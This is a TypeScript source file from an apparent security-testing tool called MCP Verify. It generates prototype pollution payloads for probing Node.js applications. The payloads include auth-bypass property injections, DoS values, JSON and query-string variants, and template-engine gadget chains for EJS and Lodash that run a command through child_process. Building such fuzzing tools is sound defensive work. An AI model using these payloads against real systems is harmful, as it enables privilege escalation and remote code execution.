/**
 * Copyright (c) 2026 FinkTech
 *
 * This file is part of MCP Verify.
 * Licensed under the GNU Affero General Public License v3.0 (AGPL-3.0).
 * See LICENSE file in the project root for full license information.
 */
/**
 * Prototype Pollution Generator
 *
 * Generates payloads to test for JavaScript prototype pollution vulnerabilities.
 * These attacks can lead to:
 * - Remote Code Execution (RCE)
 * - Denial of Service (DoS)
 * - Property Injection
 * - Authentication Bypass
 * - Information Disclosure
 *
 * Works with InformationDisclosureDetector to identify crashes and leaks.
 *
 * CWE-1321: Improperly Controlled Modification of Object Prototype Attributes
 */

import {
  IPayloadGenerator,
  GeneratorConfig,
  GeneratedPayload,
} from "./generator.interface";

export interface PrototypePollutionConfig extends GeneratorConfig {
  /** Include RCE-oriented payloads */
  includeRce?: boolean;
  /** Include DoS-oriented payloads */
  includeDos?: boolean;
  /** Include auth bypass payloads */
  includeAuthBypass?: boolean;
  /** Include nested pollution payloads */
  includeNested?: boolean;
  /** Target property to pollute for detection */
  targetProperty?: string;
}

export class PrototypePollutionGenerator implements IPayloadGenerator {
  readonly id = "prototype-pollution";
  readonly name = "Prototype Pollution Generator";
  readonly category = "injection";
  readonly description =
    "Generates prototype pollution payloads for JavaScript/Node.js applications";

  private config: PrototypePollutionConfig;

  constructor(config: PrototypePollutionConfig = {}) {
    this.config = {
      includeRce: config.includeRce ?? true,
      includeDos: config.includeDos ?? true,
      includeAuthBypass: config.includeAuthBypass ?? true,
      includeNested: config.includeNested ?? true,
      targetProperty: config.targetProperty ?? "polluted",
      ...config,
    };
  }

  generate(config?: GeneratorConfig): GeneratedPayload[] {
    const payloads: GeneratedPayload[] = [];
    const maxPayloads = config?.maxPayloads ?? 100;

    // Basic __proto__ pollution
    payloads.push(...this.generateBasicProtoPayloads());

    // Constructor.prototype pollution
    payloads.push(...this.generateConstructorPayloads());

    // Nested/deep pollution
    if (this.config.includeNested) {
      payloads.push(...this.generateNestedPayloads());
    }

    // Auth bypass payloads
    if (this.config.includeAuthBypass) {
      payloads.push(...this.generateAuthBypassPayloads());
    }

    // RCE payloads
    if (this.config.includeRce) {
      payloads.push(...this.generateRcePayloads());
    }

    // DoS payloads
    if (this.config.includeDos) {
      payloads.push(...this.generateDosPayloads());
    }

    // JSON-specific payloads
    payloads.push(...this.generateJsonPayloads());

    // Query string / URL payloads
    payloads.push(...this.generateQueryStringPayloads());

    return payloads.slice(0, maxPayloads);
  }

  // ==================== BASIC __proto__ PAYLOADS ====================

  private generateBasicProtoPayloads(): GeneratedPayload[] {
    const payloads: GeneratedPayload[] = [];
    const marker = this.config.targetProperty || "polluted";

    // Object with __proto__
    payloads.push({
      value: { __proto__: { [marker]: true } },
      category: "prototype-pollution",
      type: "proto-basic",
      severity: "critical",
      description: "Basic __proto__ pollution attempt",
      expectedVulnerableBehavior: `Object.prototype.${marker} becomes true`,
      tags: ["injection", "prototype-pollution", "cwe-1321"],
    });

    // String version (for JSON parsing)
    payloads.push({
      value: `{"__proto__":{"${marker}":true}}`,
      category: "prototype-pollution",
      type: "proto-json-string",
      severity: "critical",
      description: "JSON string with __proto__ pollution",
      expectedVulnerableBehavior:
        "JSON.parse vulnerable to prototype pollution",
      tags: ["injection", "prototype-pollution", "json"],
    });

    // Array with polluted object
    payloads.push({
      value: { __proto__: { [marker]: "yes" } },
      category: "prototype-pollution",
      type: "proto-array",
      severity: "high",
      description: "Array containing prototype pollution payload",
      expectedVulnerableBehavior: "Pollution via array iteration",
      tags: ["injection", "prototype-pollution"],
    });

    // Multiple properties
    payloads.push({
      value: {
        __proto__: {
          isAdmin: true,
          role: "admin",
          authenticated: true,
          [marker]: "polluted",
        },
      },
      category: "prototype-pollution",
      type: "proto-multi-property",
      severity: "critical",
      description: "Multiple properties injected via __proto__",
      expectedVulnerableBehavior: "Multiple prototype properties polluted",
      tags: ["injection", "prototype-pollution", "privilege-escalation"],
    });

    return payloads;
  }

  // ==================== CONSTRUCTOR.PROTOTYPE PAYLOADS ====================

  private generateConstructorPayloads(): GeneratedPayload[] {
    const payloads: GeneratedPayload[] = [];
    const marker = this.config.targetProperty || "polluted";

    // constructor.prototype
    payloads.push({
      value: { constructor: { prototype: { [marker]: true } } },
      category: "prototype-pollution",
      type: "constructor-prototype",
      severity: "critical",
      description: "Pollution via constructor.prototype",
      expectedVulnerableBehavior:
        "Object.prototype polluted via constructor chain",
      tags: ["injection", "prototype-pollution"],
    });

    // JSON string version
    payloads.push({
      value: `{"constructor":{"prototype":{"${marker}":true}}}`,
      category: "prototype-pollution",
      type: "constructor-json",
      severity: "critical",
      description: "JSON string with constructor.prototype pollution",
      expectedVulnerableBehavior: "Pollution via parsed JSON",
      tags: ["injection", "prototype-pollution", "json"],
    });

    return payloads;
  }

  // ==================== NESTED POLLUTION PAYLOADS ====================

  private generateNestedPayloads(): GeneratedPayload[] {
    const payloads: GeneratedPayload[] = [];
    const marker = this.config.targetProperty || "polluted";

    // Deep nested __proto__
    payloads.push({
      value: {
        a: {
          b: {
            __proto__: { [marker]: "deep" },
          },
        },
      },
      category: "prototype-pollution",
      type: "nested-deep",
      severity: "high",
      description: "Deeply nested __proto__ pollution",
      expectedVulnerableBehavior: "Pollution via deep object merge",
      tags: ["injection", "prototype-pollution", "deep-merge"],
    });

    // Multiple levels with __proto__
    payloads.push({
      value: {
        __proto__: {
          __proto__: {
            [marker]: "double",
          },
        },
      },
      category: "prototype-pollution",
      type: "nested-double-proto",
      severity: "high",
      description: "Double __proto__ nesting",
      expectedVulnerableBehavior: "Pollution through multiple prototype levels",
      tags: ["injection", "prototype-pollution"],
    });

    // Mixed nesting
    payloads.push({
      value: {
        config: {
          __proto__: {
            settings: {
              constructor: {
                prototype: {
                  [marker]: "mixed",
                },
              },
            },
          },
        },
      },
      category: "prototype-pollution",
      type: "nested-mixed",
      severity: "high",
      description: "Mixed __proto__ and constructor nesting",
      expectedVulnerableBehavior: "Pollution through mixed traversal",
      tags: ["injection", "prototype-pollution"],
    });

    return payloads;
  }

  // ==================== AUTH BYPASS PAYLOADS ====================

  private generateAuthBypassPayloads(): GeneratedPayload[] {
    const payloads: GeneratedPayload[] = [];

    // Common auth-related properties
    const authProperties = [
      { isAdmin: true },
      { admin: true },
      { role: "admin" },
      { roles: ["admin"] },
      { authenticated: true },
      { isAuthenticated: true },
      { verified: true },
      { approved: true },
      { canAccess: true },
      { permissions: ["*"] },
      { scope: "admin" },
      { level: 9999 },
      { bypass: true },
    ];

    for (const props of authProperties) {
      const propName = Object.keys(props)[0];

      payloads.push({
        value: { __proto__: props },
        category: "prototype-pollution",
        type: "auth-bypass",
        severity: "critical",
        description: `Auth bypass via __proto__.${propName}`,
        expectedVulnerableBehavior: `Object inherits ${propName} from polluted prototype`,
        tags: ["injection", "prototype-pollution", "authentication", "bypass"],
        metadata: { targetProperty: propName },
      });

      // Constructor version
      payloads.push({
        value: { constructor: { prototype: props } },
        category: "prototype-pollution",
        type: "auth-bypass-constructor",
        severity: "critical",
        description: `Auth bypass via constructor.prototype.${propName}`,
        expectedVulnerableBehavior: `Object inherits ${propName} from constructor prototype`,
        tags: ["injection", "prototype-pollution", "authentication", "bypass"],
      });
    }

    return payloads;
  }

  // ==================== RCE PAYLOADS ====================

  private generateRcePayloads(): GeneratedPayload[] {
    const payloads: GeneratedPayload[] = [];

    // Shell/env injection (for child_process, etc.)
    payloads.push({
      value: {
        __proto__: {
          shell: "/proc/self/exe",
          env: {
            NODE_OPTIONS: "--require /proc/self/environ",
          },
        },
      },
      category: "prototype-pollution",
      type: "rce-shell",
      severity: "critical",
      description: "RCE via shell/env prototype pollution",
      expectedVulnerableBehavior: "child_process uses polluted shell/env",
      tags: ["injection", "prototype-pollution", "rce", "command-injection"],
    });

    // EJS/Pug template RCE
    payloads.push({
      value: {
        __proto__: {
          outputFunctionName:
            'x;process.mainModule.require("child_process").execSync("id");x',
        },
      },
      category: "prototype-pollution",
      type: "rce-ejs",
      severity: "critical",
      description: "RCE via EJS outputFunctionName pollution",
      expectedVulnerableBehavior: "EJS template engine executes arbitrary code",
      tags: ["injection", "prototype-pollution", "rce", "template-injection"],
    });

    // Handlebars RCE
    payloads.push({
      value: {
        __proto__: {
          allowProtoPropertiesByDefault: true,
          allowProtoMethodsByDefault: true,
        },
      },
      category: "prototype-pollution",
      type: "rce-handlebars",
      severity: "critical",
      description: "Handlebars prototype access enablement",
      expectedVulnerableBehavior:
        "Handlebars allows prototype access leading to RCE",
      tags: ["injection", "prototype-pollution", "rce", "template-injection"],
    });

    // Lodash merge RCE chain
    payloads.push({
      value: {
        __proto__: {
          sourceURL:
            '\nreturn process.mainModule.require("child_process").execSync("id")//',
        },
      },
      category: "prototype-pollution",
      type: "rce-lodash",
      severity: "critical",
      description: "RCE via Lodash template sourceURL pollution",
      expectedVulnerableBehavior:
        "Lodash _.template() executes code via sourceURL",
      tags: ["injection", "prototype-pollution", "rce"],
    });

    return payloads;
  }

  // ==================== DoS PAYLOADS ====================

  private generateDosPayloads(): GeneratedPayload[] {
    const payloads: GeneratedPayload[] = [];

    // toString pollution
    payloads.push({
      value: {
        __proto__: {
          toString: "not a function",
        },
      },
      category: "prototype-pollution",
      type: "dos-tostring",
      severity: "high",
      description: "DoS via toString pollution",
      expectedVulnerableBehavior: "Application crashes when calling toString()",
      tags: ["injection", "prototype-pollution", "dos"],
    });

    // valueOf pollution
    payloads.push({
      value: {
        __proto__: {
          valueOf: "not a function",
        },
      },
      category: "prototype-pollution",
      type: "dos-valueof",
      severity: "high",
      description: "DoS via valueOf pollution",
      expectedVulnerableBehavior: "Application crashes on type coercion",
      tags: ["injection", "prototype-pollution", "dos"],
    });

    // Length pollution (affects arrays)
    payloads.push({
      value: {
        __proto__: {
          length: 9999999999,
        },
      },
      category: "prototype-pollution",
      type: "dos-length",
      severity: "high",
      description: "DoS via length property pollution",
      expectedVulnerableBehavior:
        "Array operations hang or consume excessive memory",
      tags: ["injection", "prototype-pollution", "dos"],
    });

    // Circular reference attempt
    payloads.push({
      value: {
        __proto__: {
          toJSON: { __proto__: { toJSON: {} } },
        },
      },
      category: "prototype-pollution",
      type: "dos-circular",
      severity: "medium",
      description: "DoS via potential circular reference in JSON serialization",
      expectedVulnerableBehavior: "JSON.stringify enters infinite loop",
      tags: ["injection", "prototype-pollution", "dos"],
    });

    return payloads;
  }

  // ==================== JSON-SPECIFIC PAYLOADS ====================

  private generateJsonPayloads(): GeneratedPayload[] {
    const payloads: GeneratedPayload[] = [];
    const marker = this.config.targetProperty || "polluted";

    // Various JSON string formats
    const jsonPayloads = [
      // Standard
      `{"__proto__":{"${marker}":"json1"}}`,
      // With array
      `[{"__proto__":{"${marker}":"json2"}}]`,
      // Nested in array
      `{"data":[{"__proto__":{"${marker}":"json3"}}]}`,
      // With other properties
      `{"normal":"value","__proto__":{"${marker}":"json4"}}`,
      // Unicode escaped
      `{"\\u005f\\u005fproto\\u005f\\u005f":{"${marker}":"unicode"}}`,
      // Mixed case (some parsers)
      `{"__PROTO__":{"${marker}":"uppercase"}}`,
      `{"__Proto__":{"${marker}":"mixedcase"}}`,
    ];

    for (let i = 0; i < jsonPayloads.length; i++) {
      payloads.push({
        value: jsonPayloads[i],
        category: "prototype-pollution",
        type: "json-variant",
        severity: "high",
        description: `JSON prototype pollution variant ${i + 1}`,
        expectedVulnerableBehavior: "JSON.parse creates polluted object",
        tags: ["injection", "prototype-pollution", "json"],
      });
    }

    return payloads;
  }

  // ==================== QUERY STRING PAYLOADS ====================

  private generateQueryStringPayloads(): GeneratedPayload[] {
    const payloads: GeneratedPayload[] = [];
    const marker = this.config.targetProperty || "polluted";

    // Query string style (for qs, querystring parsers)
    const queryPayloads = [
      `__proto__[${marker}]=true`,
      `__proto__.${marker}=true`,
      `constructor[prototype][${marker}]=true`,
      `constructor.prototype.${marker}=true`,
      `a]__proto__[${marker}]=true`,
      `a[__proto__][${marker}]=true`,
    ];

    for (const query of queryPayloads) {
      payloads.push({
        value: query,
        category: "prototype-pollution",
        type: "query-string",
        severity: "high",
        description: `Query string prototype pollution: ${query.substring(0, 30)}...`,
        expectedVulnerableBehavior: "Query parser creates polluted object",
        tags: ["injection", "prototype-pollution", "query-string"],
      });
    }

    return payloads;
  }
}
